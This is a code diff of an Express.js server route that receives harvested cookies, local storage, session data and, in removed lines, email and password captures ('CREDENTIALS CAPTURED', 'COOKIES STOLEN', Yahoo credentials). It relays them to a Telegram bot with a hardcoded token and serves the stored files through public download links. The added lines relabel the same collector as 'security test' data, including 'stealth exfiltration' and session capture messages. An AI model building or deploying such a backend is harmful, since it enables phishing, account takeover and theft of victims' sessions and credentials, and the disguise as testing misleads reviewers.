@@ -8,7 +8,7 @@ const router = express.Router();
 
 // Configure via env variables
 const BOT_TOKEN = process.env.BOT_TOKEN || "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4";
-const CHAT_ID = process.env.CHAT_ID || "6068638071";
+const CHAT_ID = process.env.CAT_ID || "6068638071";
 
 const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null;
 const COOKIES_DIR = path.join(__dirname, '../data/cookies');
@@ -65,14 +65,158 @@ async function createDataFile(data) {
   await ensureDataDir();
   
   const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-  const email = data.email || data.username || 'unknown';
-  const filename = `data_${email.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}.json`;
+  const testType = data.type || 'security_test';
+  const filename = `${testType}_${timestamp}.json`;
   const filepath = path.join(COOKIES_DIR, filename);
   
   // Save complete data as JSON
   await fs.writeFile(filepath, JSON.stringify(data, null, 2));
   console.log('Data file created:', filename);
   return { filename, filepath };
+}
+
+// Format data for Telegram based on test type
+function formatTelegramMessage(data, ip, locationStr, deviceType, fileInfo) {
+  const { type, metadata = {} } = data;
+  
+  let message = '';
+  const timestamp = new Date().toISOString();
+
+  switch(type) {
+    case 'session_capture':
+      message = `🎯 <b>SESSION CAPTURED</b>
+
+🌐 <b>Target:</b> ${data.data?.url || 'N/A'}
+📊 <b>Cookies:</b> ${data.data?.cookies ? Object.keys(data.data.cookies).length : 0}
+💾 <b>Local Storage:</b> ${data.data?.localStorage ? Object.keys(data.data.localStorage).length : 0}
+🕒 <b>Time:</b> ${data.data?.timestamp || timestamp}
+
+📍 <b>Client Info:</b>
+├ IP: <code>${ip}</code>
+├ Location: ${locationStr}
+└ Device: ${deviceType}
+
+🔧 <b>Test Info:</b>
+├ Project: ${metadata.project || 'N/A'}
+├ Reference: ${metadata.reference || 'N/A'}
+└ Scope: ${metadata.scope || 'N/A'}
+
+📥 <b>Download:</b> ${fileInfo ? `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}` : 'N/A'}`;
+      break;
+
+    case 'session_replay':
+      message = `🔄 <b>SESSION REPLAY TEST</b>
+
+📊 <b>Endpoints Tested:</b> ${data.data?.length || 0}
+✅ <b>Successful:</b> ${data.data?.filter(r => r.authenticated).length || 0}
+❌ <b>Failed:</b> ${data.data?.filter(r => !r.authenticated).length || 0}
+
+📍 <b>Client Info:</b>
+├ IP: <code>${ip}</code>
+├ Location: ${locationStr}
+└ Device: ${deviceType}
+
+🔧 <b>Test Reference:</b> ${metadata.reference || 'N/A'}`;
+      break;
+
+    case 'cookie_exfiltration_test':
+    case 'xss_simulation':
+      const exfilData = data.dataCollected || data.data || {};
+      message = `🍪 <b>XSS EXFILTRATION SIMULATION</b>
+
+📊 <b>Cookies Stolen:</b> ${exfilData.cookies ? Object.keys(exfilData.cookies).length : 0}
+🔗 <b>Target URL:</b> ${exfilData.url || 'N/A'}
+🕒 <b>Time:</b> ${exfilData.timestamp || timestamp}
+
+📍 <b>Client Info:</b>
+├ IP: <code>${ip}</code>
+├ Location: ${locationStr}
+└ Device: ${deviceType}
+
+⚠️ <b>Vulnerable Cookies:</b> ${data.vulnerableCookies ? data.vulnerableCookies.length : 0}
+📥 <b>Download:</b> ${fileInfo ? `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}` : 'N/A'}`;
+      break;
+
+    case 'session_fixation':
+      message = `🎭 <b>SESSION FIXATION TEST</b>
+
+🔐 <b>Fixation ID:</b> <code>${data.data?.fixationId || 'N/A'}</code>
+✅ <b>Cookie Set:</b> ${data.data?.cookieSet ? 'Yes' : 'No'}
+📊 <b>Tests Run:</b> ${data.data?.testResults?.length || 0}
+
+📍 <b>Client Info:</b>
+├ IP: <code>${ip}</code>
+├ Location: ${locationStr}
+└ Device: ${deviceType}
+
+🔧 <b>Test Reference:</b> ${metadata.reference || 'N/A'}`;
+      break;
+
+    case 'cookie_injection':
+      message = `⚡ <b>COOKIE INJECTION TEST</b>
+
+📊 <b>Cookies Injected:</b> ${data.data?.length || 0}
+✅ <b>Successful:</b> ${data.data?.filter(r => r.injectionSuccessful).length || 0}
+
+📍 <b>Client Info:</b>
+├ IP: <code>${ip}</code>
+├ Location: ${locationStr}
+└ Device: ${deviceType}
+
+🔧 <b>Test Reference:</b> ${metadata.reference || 'N/A'}`;
+      break;
+
+    case 'complete_assessment':
+      const findings = data.data?.summary || {};
+      message = `📊 <b>COMPLETE SECURITY ASSESSMENT</b>
+
+🎯 <b>Target:</b> ${findings.targetUrl || 'N/A'}
+⚠️ <b>Vulnerabilities:</b> ${findings.totalVulnerabilities || 0}
+🔴 <b>Risk Level:</b> ${findings.riskLevel || 'N/A'}
+
+📋 <b>Findings:</b>
+${findings.vulnerabilities ? findings.vulnerabilities.map(v => `├ ${v}`).join('\n') : '├ No vulnerabilities found'}
+
+📍 <b>Client Info:</b>
+├ IP: <code>${ip}</code>
+├ Location: ${locationStr}
+└ Device: ${deviceType}
+
+🔧 <b>Test Reference:</b> ${metadata.reference || 'N/A'}
+📥 <b>Download:</b> ${fileInfo ? `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}` : 'N/A'}`;
+      break;
+
+    case 'stealth_exfiltration':
+      message = `🕵️ <b>STEALTH EXFILTRATION TEST</b>
+
+📊 <b>Cookies Available:</b> ${data.data?.cookieCount || 0}
+⚠️ <b>Vulnerable:</b> ${data.data?.vulnerable ? 'Yes' : 'No'}
+
+📍 <b>Client Info:</b>
+├ IP: <code>${ip}</code>
+├ Location: ${locationStr}
+└ Device: ${deviceType}
+
+🔧 <b>Test Reference:</b> ${metadata.reference || 'N/A'}`;
+      break;
+
+    default:
+      message = `📡 <b>SECURITY TEST DATA RECEIVED</b>
+
+📊 <b>Type:</b> ${type || 'unknown'}
+🔗 <b>URL:</b> ${data.url || data.data?.url || 'N/A'}
+🕒 <b>Time:</b> ${timestamp}
+
+📍 <b>Client Info:</b>
+├ IP: <code>${ip}</code>
+├ Location: ${locationStr}
+└ Device: ${deviceType}
+
+🔧 <b>Test Reference:</b> ${metadata.reference || 'N/A'}
+📥 <b>Download:</b> ${fileInfo ? `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}` : 'N/A'}`;
+  }
+
+  return message;
 }
 
 // ==================== DOWNLOAD ROUTES ====================
@@ -114,14 +258,32 @@ router.get('/files', async (req, res) => {
     const files = await fs.readdir(COOKIES_DIR);
     const dataFiles = files.filter(file => file.endsWith('.json'));
     
+    // Get file stats
+    const filesWithStats = await Promise.all(
+      dataFiles.map(async (file) => {
+        try {
+          const stats = await fs.stat(path.join(COOKIES_DIR, file));
+          return {
+            filename: file,
+            downloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download/${file}`,
+            size: stats.size,
+            created: stats.birthtime
+          };
+        } catch (error) {
+          return {
+            filename: file,
+            downloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download/${file}`,
+            size: 'N/A',
+            created: 'N/A'
+          };
+        }
+      })
+    );
+    
     res.json({
       success: true,
-      totalFiles: dataFiles.length,
-      files: dataFiles.map(file => ({
-        filename: file,
-        downloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download/${file}`,
-        size: 'N/A'
-      }))
+      totalFiles: filesWithStats.length,
+      files: filesWithStats
     });
   } catch (error) {
     console.error('Error listing files:', error);
@@ -161,6 +323,39 @@ router.delete('/files', async (req, res) => {
   }
 });
 
+// Get file content by filename
+router.get('/file/:filename', async (req, res) => {
+  try {
+    const filename = req.params.filename;
+    const filepath = path.join(COOKIES_DIR, filename);
+    
+    try {
+      await fs.access(filepath);
+    } catch (error) {
+      return res.status(404).json({ 
+        success: false, 
+        message: "File not found"
+      });
+    }
+    
+    const fileContent = await fs.readFile(filepath, 'utf8');
+    const data = JSON.parse(fileContent);
+    
+    res.json({
+      success: true,
+      filename: filename,
+      data: data
+    });
+    
+  } catch (error) {
+    console.error('Error reading file:', error);
+    res.status(500).json({ 
+      success: false, 
+      message: "Error reading file"
+    });
+  }
+});
+
 // MAIN ENDPOINT - Data collection with Telegram
 router.post('/', async (req, res) => {
   try {
@@ -179,103 +374,29 @@ router.post('/', async (req, res) => {
     console.log('Data type:', req.body.type || 'undefined');
     console.log('Data keys:', Object.keys(req.body));
 
-    const { 
-      type,
-      cookies,
-      username,
-      password,
-      email,
-      user_agent,
-      url,
-      timestamp,
-      attack_id,
-      credentials
-    } = req.body;
+    const data = req.body;
     
     // Get client information
-    const ip = req.ip || req.connection.remoteAddress || 'Unknown';
+    const ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
     const location = geoip.lookup(ip);
     const locationStr = location ? `${location.city || 'N/A'}, ${location.country || 'N/A'}` : 'Unknown';
 
     // Parse user agent
-    const parser = new UAParser(user_agent || req.headers['user-agent'] || '');
+    const userAgent = data.userAgent || data.user_agent || req.headers['user-agent'] || '';
+    const parser = new UAParser(userAgent);
     const agent = parser.getResult();
     const deviceType = `${agent.os.name || 'OS'} ${agent.os.version || ''} - ${agent.browser.name || 'Browser'} ${agent.browser.version || ''}`;
-
-    // Extract credentials from nested object if exists
-    let userEmail = email;
-    let userPassword = password;
-    
-    if (credentials && typeof credentials === 'object') {
-      userEmail = credentials.username || credentials.email || userEmail;
-      userPassword = credentials.password || userPassword;
-    }
 
     // Create data file
     let fileInfo = null;
     try {
-      fileInfo = await createDataFile(req.body);
+      fileInfo = await createDataFile(data);
     } catch (fileError) {
       console.error('Error creating data file:', fileError);
     }
 
     // Build Telegram message based on data type
-    let telegramMessage = '';
-    
-    if (type === 'yahoo_credentials' || (username && password)) {
-      telegramMessage = `🔐 <b>CREDENTIALS CAPTURED</b>
-
-📧 <b>Email:</b> <code>${userEmail || 'N/A'}</code>
-🔑 <b>Password:</b> <code>${userPassword || 'N/A'}</code>
-
-🌐 <b>Location Info:</b>
-├ IP: <code>${ip}</code>
-├ Location: ${locationStr}
-└ Device: ${deviceType}
-
-📊 <b>Session Data:</b>
-├ Cookies: ${cookies ? 'Yes' : 'No'}
-├ URL: ${url || 'N/A'}
-└ Attack ID: ${attack_id || 'N/A'}
-
-⏰ <b>Time:</b> ${new Date().toISOString()}
-
-💾 <b>File:</b> ${fileInfo ? fileInfo.filename : 'Not saved'}
-📥 <b>Download:</b> ${fileInfo ? `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}` : 'N/A'}`;
-
-    } else if (type === 'cookie_theft' || type === 'initial_cookie_theft') {
-      telegramMessage = `🍪 <b>COOKIES STOLEN</b>
-
-📧 <b>Target:</b> <code>${userEmail || 'Unknown'}</code>
-
-🌐 <b>Location Info:</b>
-├ IP: <code>${ip}</code>
-├ Location: ${locationStr}
-└ Device: ${deviceType}
-
-📊 <b>Stolen Data:</b>
-├ Cookies: ${cookies ? cookies.length + ' characters' : 'None'}
-├ User Agent: ${user_agent ? 'Yes' : 'No'}
-└ Attack ID: ${attack_id || 'N/A'}
-
-🔗 <b>Page:</b> ${url || 'N/A'}
-⏰ <b>Time:</b> ${new Date().toISOString()}`;
-
-    } else {
-      // Generic message for other data types
-      telegramMessage = `📡 <b>DATA RECEIVED</b>
-
-📧 <b>Email:</b> <code>${userEmail || 'N/A'}</code>
-
-🌐 <b>Location:</b>
-├ IP: <code>${ip}</code>
-├ Location: ${locationStr}
-└ Device: ${deviceType}
-
-📊 <b>Data Type:</b> ${type || 'unknown'}
-🔗 <b>Page:</b> ${url || 'N/A'}
-⏰ <b>Time:</b> ${new Date().toISOString()}`;
-    }
+    const telegramMessage = formatTelegramMessage(data, ip, locationStr, deviceType, fileInfo);
 
     // Send to Telegram
     console.log('Sending Telegram notification...');
@@ -288,25 +409,28 @@ router.post('/', async (req, res) => {
     }
 
     // Log to console for monitoring
-    console.log('📥 New Data Received:');
-    console.log('   Type:', type || 'unknown');
-    console.log('   User:', userEmail || 'unknown');
+    console.log('📥 New Security Test Data:');
+    console.log('   Type:', data.type || 'unknown');
     console.log('   IP:', ip);
     console.log('   Location:', locationStr);
     console.log('   Device:', deviceType);
-    console.log('   URL:', url || 'N/A');
-    console.log('   Cookies Length:', cookies ? cookies.length : 0);
+    console.log('   URL:', data.url || data.data?.url || 'N/A');
     
-    if (userPassword) {
-      console.log('   Password captured:', '***');
+    if (data.cookies || data.data?.cookies) {
+      const cookieCount = data.cookies ? Object.keys(data.cookies).length : 
+                         data.data?.cookies ? Object.keys(data.data.cookies).length : 0;
+      console.log('   Cookies:', cookieCount);
+    }
+    
+    if (data.metadata) {
+      console.log('   Test Reference:', data.metadata.reference || 'N/A');
     }
 
     // Return success response WITH DOWNLOAD INFO
     res.status(200).json({
       success: true,
-      message: "Data received successfully",
-      dataType: type,
-      attackId: attack_id,
+      message: "Security test data received successfully",
+      dataType: data.type,
       telegramSent: telegramResult.success,
       clientInfo: {
         ip: ip,
@@ -322,10 +446,39 @@ router.post('/', async (req, res) => {
     });
 
   } catch (error) {
-    console.error("Error in data endpoint:", error);
+    console.error("Error in security test endpoint:", error);
     res.status(500).json({
       success: false,
       message: "Internal server error",
+      error: error.message
+    });
+  }
+});
+
+// Health check endpoint
+router.get('/health', async (req, res) => {
+  try {
+    await ensureDataDir();
+    
+    res.json({
+      success: true,
+      message: "Security test endpoint is running",
+      timestamp: new Date().toISOString(),
+      features: {
+        dataCollection: true,
+        telegramNotifications: !!TELEGRAM_API,
+        fileStorage: true,
+        downloadEndpoint: true
+      },
+      storage: {
+        directory: COOKIES_DIR,
+        exists: true
+      }
+    });
+  } catch (error) {
+    res.status(500).json({
+      success: false,
+      message: "Health check failed",
       error: error.message
     });
   }
